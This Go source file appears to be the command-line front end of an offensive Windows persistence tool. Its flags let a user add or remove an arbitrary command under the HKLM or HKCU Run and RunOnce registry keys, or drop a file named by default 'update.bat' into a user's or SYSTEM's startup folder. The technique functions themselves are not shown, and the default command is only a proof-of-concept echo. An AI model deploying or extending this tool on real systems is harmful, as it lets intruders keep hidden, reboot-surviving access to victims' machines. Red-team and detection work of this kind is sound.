package main

// importing packages, techniques is pulled locally
import (
	"./techniques"
	"fmt"
	"flag"
	"os"
)

func main(){
	// defining argument variables
	var technique string
	var command string
	var regValue string
	var method string
	var regKey string
	var user string
	var filename string

	// initializing valid arguments
	flag.StringVar(&technique, "t", "registry", "Specify a persistence technique to use, valid options are:\n- registry\n- startupfolder\n")
	flag.StringVar(&command, "c", "cmd.exe /c echo 'This was created for persistence' > C:\\poc.txt", "Set the command or binary to be used for persistence")
	flag.StringVar(&regValue, "v", "*a", "Set the registry value to be set for persistence")
	flag.StringVar(&regKey, "k", "hklmrunonce", "Specify the registry key to be edited for persistence, options include:\n- hklmrunonce: RunOnce key under HKEY LOCAL_MACHINE\n- hklmrun: Run key under HKEY LOCAL_MACHINE\n- hkcurunonce: RunOnce key under HKEY CURRENT_USER\n- hkcurun: Run key under HKEY CURRENT_USER\n")
	flag.StringVar(&method, "m", "add", "add or remove the persistence technique (add will overwrite files/registry values if they already exist)")
	flag.StringVar(&user, "u", "Current User", "Specify the user for startupfolder persistence, or specify SYSTEM for the system startup folder")
	flag.StringVar(&filename, "f", "update.bat", "Specify the filename to be written (currently only used for startupfolder persistence)")

	// ensuring it's not run with exclusively defaults
	if !(len(os.Args) > 1){
		fmt.Printf("Try running %s -h to see command line options\n",os.Args[0])
		return
	}

	flag.Parse()

	// checking technique and calling the applicable persistence technique function
	if technique == "registry" {
		techniques.RegPersist(command, regValue, regKey, method)
	} else if technique == "startupfolder" {
		techniques.StartupFolderPersist(user, command, filename, method)
	} else {
		fmt.Printf("[!] %s is not a valid technique\n",technique)
		return
	}
}